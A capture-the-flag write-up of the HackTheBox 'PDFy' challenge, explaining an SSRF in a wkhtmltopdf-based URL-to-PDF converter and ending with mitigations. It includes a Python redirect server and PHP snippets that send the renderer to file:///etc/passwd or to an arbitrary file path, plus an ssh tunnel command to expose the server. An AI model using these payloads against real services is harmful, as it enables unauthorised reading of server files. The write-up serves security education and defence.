+<p>Upon accessing the application, we see a simple interface allowing users to convert web pages to PDFs:</p>
+<p><img alt="Pasted image 20250513181156.png" src="../../assets/images/Pasted%20image%2020250513181156.png" /></p>
+<ol>
+<li>The user inputs a URL</li>
+<li>The application fetches that URL and renders it to a PDF using wkhtmltopdf</li>
+<li>The PDF is stored at <code>/static/pdfs/[filename].pdf</code> and made available for download</li>
+</ol>
+<p>Through initial testing with legitimate URLs (like google.com), we can see the application successfully converts webpages to PDFs.</p>
+<p><img alt="Pasted image 20250513181319.png" src="../../assets/images/Pasted%20image%2020250513181319.png" /></p>
+<h2 id="analyzing-the-application">Analyzing the Application</h2>
+<p>By examining the application behavior, we can determine:</p>
+<ol>
+<li>The application accepts a URL as input via a JSON payload with a <code>url</code> field</li>
+<li>It passes this URL to wkhtmltopdf for rendering</li>
+<li>Error messages reveal the use of wkhtmltopdf in the backend</li>
+<li>The application doesn't appear to have proper URL validation</li>
+</ol>
+<h2 id="exploitation-strategy">Exploitation Strategy</h2>
+<p>The exploitation strategy involves:</p>
+<ol>
+<li>Creating a web server that responds with a redirect to <code>file:///etc/passwd</code></li>
+<li>Making the PDFy application request our malicious server</li>
+<li>wkhtmltopdf will follow the redirect to the local file</li>
+<li>The contents of <code>/etc/passwd</code> will be included in the generated PDF</li>
+</ol>
+<h2 id="detailed-exploitation-steps">Detailed Exploitation Steps</h2>
+<h3 id="step-1-create-a-redirect-server">Step 1: Create a Redirect Server</h3>
+<p>We set up a simple HTTP server that redirects all requests to <code>file:///etc/passwd</code>. Since PHP wasn't available in my local, we used Python:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">http.server</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socketserver</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">class</span><span class="w"> </span><span class="nc">RedirectHandler</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Received request - redirecting to file:///etc/passwd&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Location&quot;</span><span class="p">,</span> <span class="s2">&quot;file:///etc/passwd&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">PORT</span> <span class="o">=</span> <span class="mi">8081</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="n">Handler</span> <span class="o">=</span> <span class="n">RedirectHandler</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="k">with</span> <span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">Handler</span><span class="p">)</span> <span class="k">as</span> <span class="n">httpd</span><span class="p">:</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Server running at port </span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div>
+<p>This server listens on port 8081 and responds to all GET requests with a 302 redirect to <code>file:///etc/passwd</code>.</p>
+<p><img alt="Pasted image 20250513182039.png" src="../../assets/images/Pasted%20image%2020250513182039.png" /></p>
+<h3 id="step-2-expose-the-local-server-to-the-internet">Step 2: Expose the Local Server to the Internet</h3>
+<p>Since our server is running locally, we need to make it accessible to the PDFy application. We used localhost.run to create a secure tunnel:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">80</span>:localhost:8081<span class="w"> </span>nokey@localhost.run
+</code></pre></div>
+<p>This command creates a tunnel that forwards traffic from a public URL (provided by localhost.run) to our local server on port 8081. In our case, we received the URL <code>https://9ba152a3947672.lhr.life</code>.</p>
+<p><img alt="Pasted image 20250513182017.png" src="../../assets/images/Pasted%20image%2020250513182017.png" /></p>
+<h3 id="step-3-submit-the-malicious-url-to-pdfy">Step 3: Submit the Malicious URL to PDFy</h3>
+<p>We submitted our public URL (<code>https://9ba152a3947672.lhr.life</code>) to the PDFy application.</p>
+<p><img alt="Pasted image 20250513181949.png" src="../../assets/images/Pasted%20image%2020250513181949.png" /></p>
+<h3 id="step-4-pdfy-processes-the-request">Step 4: PDFy Processes the Request</h3>
+<p>When PDFy receives our URL:</p>
+<ol>
+<li>It passes the URL to wkhtmltopdf for rendering</li>
+<li>wkhtmltopdf sends a GET request to our server</li>
+<li>Our server responds with a 302 redirect to <code>file:///etc/passwd</code></li>
+<li>wkhtmltopdf follows this redirect and attempts to render the local file</li>
+<li>The contents of <code>/etc/passwd</code> are included in the generated PDF</li>
+</ol>
+<p><img alt="Pasted image 20250513181906.png" src="../../assets/images/Pasted%20image%2020250513181906.png" /></p>
+<h3 id="step-5-download-and-view-the-pdf">Step 5: Download and View the PDF</h3>
+<p>After the PDFy application generates the PDF, we download and open it. The PDF contains the contents of <code>/etc/passwd</code> from the target server, including the flag</p>
+<p><img alt="Pasted image 20250513180806.png" src="../../assets/images/Pasted%20image%2020250513180806.png" /></p>
+<h2 id="technical-explanation-of-the-vulnerability">Technical Explanation of the Vulnerability</h2>
+<p>The vulnerability exists because:</p>
+<ol>
+<li><strong>Improper URL Validation</strong>: The application doesn't validate or sanitize the URL input</li>
+<li><strong>Redirect Handling</strong>: wkhtmltopdf follows HTTP redirects without proper validation</li>
+<li><strong>Protocol Handling</strong>: wkhtmltopdf allows access to the <code>file://</code> URI scheme, which should never be accessible from a web-driven PDF generator</li>
+</ol>
+<p>When wkhtmltopdf follows a redirect to a <code>file://</code> URI, it attempts to read the file from the local filesystem of the server running the wkhtmltopdf process. This allows attackers to read sensitive files from the server.</p>
+<p><img alt="Pasted image 20250513201949.png" src="../../assets/images/Pasted%20image%2020250513201949.png" /></p>
+<h2 id="alternative-exploitation-approaches">Alternative Exploitation Approaches</h2>
+<h3 id="using-php-if-available">Using PHP (if available)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: file:///etc/passwd&quot;</span><span class="p">);</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<h3 id="using-iframes-also-effective">Using iframes (also effective)</h3>
+<p>An alternative approach would be to use an iframe in HTML:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://your-server/redirect.php?x=/etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;1000px&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;1000px&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Where <code>redirect.php</code> contains:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span> 
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">header</span><span class="p">(</span><span class="s1">&#39;location:file://&#39;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span> 
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<h2 id="mitigation-recommendations">Mitigation Recommendations</h2>
+<p>To prevent this type of vulnerability, developers should:</p>
+<ol>
+<li><strong>Implement URL Validation</strong>: Only allow specific URL schemes (http, https) and domains</li>
+<li><strong>Disable File Protocol</strong>: Explicitly disable the <code>file://</code> protocol in wkhtmltopdf with the <code>--disable-local-file-access</code> flag</li>
+<li><strong>Use a Whitelist Approach</strong>: Only allow conversion of URLs from trusted domains</li>
+<li><strong>Update Libraries</strong>: Keep wkhtmltopdf and other dependencies updated to patched versions</li>
+<li><strong>Run in Isolation</strong>: Run the PDF generation process in a containerized environment with minimal privileges</li>
+</ol>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Always Validate User Input</strong>: Any user-controlled input that affects server-side operations must be properly validated and sanitized</li>
+<li><strong>Understand Your Tools</strong>: Understanding the security implications of libraries like wkhtmltopdf is critical</li>
+<li><strong>Protocol Security</strong>: Special attention should be paid to applications that handle multiple URL protocols</li>
+<li><strong>Defense in Depth</strong>: Multiple layers of protection are needed when dealing with user-controlled URLs</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>The PDFy challenge demonstrates a common vulnerability in web applications that generate PDFs from HTML content. By exploiting the SSRF vulnerability in wkhtmltopdf, we were able to read sensitive files from the target server and obtain the flag.</p>
+<p>This type of vulnerability is particularly dangerous because it can lead to information disclosure, internal network scanning, and potentially remote code execution. Understanding how to identify and exploit such vulnerabilities is crucial for web application security testing.</p>
+<h2 id="appendix-references">Appendix: References</h2>
+<ul>
+<li><a href="https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249">CVE-2022-35583</a> - wkhtmltopdf vulnerability details</li>
+<li><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/">wkhtmltopdf SSRF</a> - Exploit documentation</li>
+<li><a href="https://app.hackthebox.com/challenges/pdfy">HackTheBox PDFy Challenge</a> - Original challenge (requires HTB account)</li>
+<li><a href="https://localhost.run/">localhost.run</a> - Tool used for exposing local server</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "search.suggest", "search.highlight", "content.code.annotate", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
